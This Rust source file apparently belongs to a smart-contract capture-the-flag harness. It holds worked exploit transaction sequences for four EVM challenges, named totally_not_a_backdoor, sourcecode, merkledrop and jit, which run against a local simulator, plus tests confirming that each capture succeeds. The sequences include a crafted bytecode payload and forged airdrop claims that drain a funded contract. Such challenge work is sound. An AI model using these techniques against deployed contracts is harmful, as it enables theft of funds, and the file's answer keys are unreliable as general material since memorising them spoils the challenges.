use std::str::FromStr;

use anyhow::Error;
use ethers_core::{
    abi::{self, parse_abi, Token},
    types::{self, H160},
};
use revm::primitives::{
    alloy_primitives::U160, hex::FromHex, Address, Bytecode, Bytes, HashMap, HashSet, SpecId,
    TransactTo, U256,
};

use crate::{
    db::BlockConfig,
    types::{Account, Environment, Secret, TargetCondition, Transaction, TxSim},
};

use self::constants::*;

mod constants;

pub fn totally_not_a_backdoor() -> Result<Secret, Error> {
    let allowed_account = Address::from(U160::from(16));
    let target_contract = Address::from(U160::from(17));
    let env = Environment {
        spec: SpecId::LATEST,
        block_config: BlockConfig::default(),
        allowed_accounts: HashSet::from_iter([allowed_account]),
        accounts: HashMap::from_iter([
            (allowed_account, Account::new(U256::ZERO, None)),
            (
                target_contract,
                Account::new(
                    U256::ZERO,
                    Some(Bytecode::new_raw(
                        Bytes::from_hex(TOTALLY_NOT_A_BACKDOOR_BYTECODE).unwrap(),
                    )),
                ),
            ),
        ]),
        storage: HashMap::new(),
        target_condition: TargetCondition::new_captured(target_contract),
    };

    let abi = parse_abi(&["function notABackdoor(address)", "function capture()"])?;
    let txs =
        vec![
            TxSim::Transaction(Transaction {
                caller: allowed_account,
                transact_to: TransactTo::Call(target_contract),
                value: U256::ZERO,
                data: Bytes::from(abi.function("notABackdoor")?.encode_input(&[
                    Token::Address(H160::from_slice(allowed_account.as_slice())),
                ])?),
                nonce: 0,
                gas_limit: None,
                access_list: vec![],
            }),
            TxSim::Transaction(Transaction {
                caller: allowed_account,
                transact_to: TransactTo::Call(target_contract),
                value: U256::ZERO,
                data: Bytes::from(abi.function("capture")?.encode_input(&[])?),
                nonce: 1,
                gas_limit: None,
                access_list: vec![],
            }),
        ];

    Ok(Secret {
        submitter: H160::from_slice(allowed_account.as_slice()),
        txs,
        enviroment: env,
    })
}

pub fn sourcecode() -> Result<Secret, Error> {
    let allowed_account = Address::from(U160::from(16));
    let target_contract = Address::from(U160::from(17));
    let env = Environment {
        spec: SpecId::LATEST,
        block_config: BlockConfig::default(),
        allowed_accounts: HashSet::from_iter([allowed_account]),
        accounts: HashMap::from_iter([
            (allowed_account, Account::new(U256::ZERO, None)),
            (
                target_contract,
                Account::new(
                    U256::ZERO,
                    Some(Bytecode::new_raw(
                        Bytes::from_hex(SOURCECODE_BYTECODE).unwrap(),
                    )),
                ),
            ),
        ]),
        storage: HashMap::new(),
        target_condition: TargetCondition::new_captured(target_contract),
    };

    let abi = parse_abi(&["function submitCode(bytes)", "function capture()"])?;
    let txs = vec![
            TxSim::Transaction(Transaction {
                caller: allowed_account,
                transact_to: TransactTo::Call(target_contract),
                value: U256::ZERO,
                data: Bytes::from(abi.function("submitCode")?.encode_input(&[Token::Bytes(
                    ethers_core::abi::Bytes::from_hex("0x7f806cffffffffffffffffffffffffff50600152602152607f60005360416000f3806cffffffffffffffffffffffffff50600152602152607f60005360416000f3").unwrap(),
                )])?),
                nonce: 0,
                gas_limit: None,
                access_list: vec![],
            }),
            TxSim::Transaction(Transaction {
                caller: allowed_account,
                transact_to: TransactTo::Call(target_contract),
                value: U256::ZERO,
                data: Bytes::from(abi.function("capture")?.encode_input(&[])?),
                nonce: 1,
                gas_limit: None,
                access_list: vec![],
            }),
        ];

    Ok(Secret {
        submitter: H160::from_slice(allowed_account.as_slice()),
        txs,
        enviroment: env,
    })
}

pub fn merkledrop() -> Result<Secret, Error> {
    let allowed_account = Address::from(U160::from(16));
    let target_contract = Address::from(U160::from(17));
    let env = Environment::builder()
        .target_condition(TargetCondition::new_captured(target_contract))
        .allowed_account(allowed_account)
        .account(allowed_account, Account::new(U256::ZERO, None))
        .account(
            target_contract,
            Account::new(
                U256::from(75000) * U256::from(1_000_000_000_000_000_000u128),
                Some(Bytecode::new_raw(
                    Bytes::from_hex(MERKLEDROP_BYTECODE).unwrap(),
                )),
            ),
        )
        .build();

    let abi = parse_abi(&[
        "claim(uint256,address,uint96,bytes32[])",
        "function capture()",
    ])?;
    let txs = vec![
        TxSim::Transaction(
            Transaction::builder()
                .caller(allowed_account)
                .to(target_contract)
                .data(Bytes::from(abi.function("claim")?.encode_input(&[
                    Token::Uint(types::U256::from_str(
                        "0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442",
                    )?),
                    Token::Address(types::H160::from_str(
                        "0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A",
                    )?),
                    Token::Uint(types::U256::from_str("0xf40f0c122ae08d2207b")?),
                    Token::Array([
                        "0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d",
                        "0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde",
                        "0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813",
                        "0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c",
                        "0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5",
                    ].iter().map(|e| Token::FixedBytes(abi::FixedBytes::from_hex(e).unwrap())).collect::<Vec<_>>(),)
                ])?))
                .nonce(0)
                .build(),
        ),
        TxSim::Transaction(
            Transaction::builder()
                .caller(allowed_account)
                .to(target_contract)
                .data(Bytes::from(abi.function("claim")?.encode_input(&[
                    Token::Uint(types::U256::from(8)),
                    Token::Address(types::H160::from_str(
                        "0x249934e4C5b838F920883a9f3ceC255C0aB3f827",
                    )?),
                    Token::Uint(types::U256::from_str("0xa0d154c64a300ddf85")?),
                    Token::Array([
                        "0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00",
                        "0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3",
                        "0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2",
                        "0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a",
                        "0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c",
                        "0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5",
                    ].iter().map(|e| Token::FixedBytes(abi::FixedBytes::from_hex(e).unwrap())).collect::<Vec<_>>(),)
                ])?))
                .nonce(1)
                .build(),
        ),
        TxSim::Transaction(
            Transaction::builder()
                .caller(allowed_account)
                .to(target_contract)
                .data(Bytes::from(abi.function("capture")?.encode_input(&[])?))
                .nonce(2)
                .build(),
        ),
    ];

    Ok(Secret {
        submitter: H160::from_slice(allowed_account.as_slice()),
        txs,
        enviroment: env,
    })
}

pub fn jit() -> Result<Secret, Error> {
    let allowed_account = Address::from(U160::from(16));
    let target_contract = Address::from(U160::from(17));
    let env = Environment {
        spec: SpecId::LATEST,
        block_config: BlockConfig::default(),
        allowed_accounts: HashSet::from_iter([allowed_account]),
        accounts: HashMap::from_iter([
            (allowed_account, Account::new(U256::ZERO, None)),
            (
                target_contract,
                Account::new(
                    U256::from(50),
                    Some(Bytecode::new_raw(Bytes::from_hex(JIT_BYTECODE).unwrap())),
                ),
            ),
        ]),
        storage: HashMap::new(),
        target_condition: TargetCondition::new_captured(target_contract),
    };

    let abi = parse_abi(&["function invoke(bytes,bytes)", "function capture()"])?;
    let txs = vec![
        TxSim::Transaction(Transaction {
            caller: allowed_account,
            transact_to: TransactTo::Call(target_contract),
            value: U256::ZERO,
            data: Bytes::from(abi.function("invoke")?.encode_input(&[
                Token::Bytes(b"[#######################]".to_vec()),
                Token::Bytes(b"".to_vec()),
            ])?),
            nonce: 0,
            gas_limit: None,
            access_list: vec![],
        }),
        TxSim::Transaction(Transaction {
            caller: allowed_account,
            transact_to: TransactTo::Call(target_contract),
            value: U256::ZERO,
            data: Bytes::from(abi.function("invoke")?.encode_input(&[
                Token::Bytes(b"########################[]".to_vec()),
                Token::Bytes(b"".to_vec()),
            ])?),
            nonce: 1,
            gas_limit: None,
            access_list: vec![],
        }),
        TxSim::Transaction(Transaction {
            caller: allowed_account,
            transact_to: TransactTo::Call(target_contract),
            value: U256::ZERO,
            data: Bytes::from(abi.function("invoke")?.encode_input(&[
                Token::Bytes(b"[################\x64S[\xff".to_vec()),
                Token::Bytes(b"".to_vec()),
            ])?),
            nonce: 2,
            gas_limit: None,
            access_list: vec![],
        }),
        TxSim::Transaction(Transaction {
            caller: allowed_account,
            transact_to: TransactTo::Call(target_contract),
            value: U256::ZERO,
            data: Bytes::from(abi.function("capture")?.encode_input(&[])?),
            nonce: 3,
            gas_limit: None,
            access_list: vec![(target_contract, vec![U256::ZERO])],
        }),
    ];

    Ok(Secret {
        submitter: H160::from_slice(allowed_account.as_slice()),
        txs,
        enviroment: env,
    })
}

#[cfg(test)]
mod tests {
    use crate::transact;

    #[test]
    fn test_totally_not_a_backdoor() {
        let secret = crate::secrets::totally_not_a_backdoor().expect("Should contruct secret");
        let _result = transact(secret).expect("Should not revert");
    }

    #[test]
    fn test_sourcecode() {
        let secret = crate::secrets::sourcecode().expect("Should contruct secret");
        let _result = transact(secret).expect("Should not revert");
    }

    #[test]
    fn test_merkledrop() {
        let secret = crate::secrets::merkledrop().expect("Should contruct secret");
        let _result = transact(secret).expect("Should not revert");
    }

    #[test]
    fn test_jit() {
        let secret = crate::secrets::jit().expect("Should contruct secret");
        let _result = transact(secret).expect("Should not revert");
    }
}
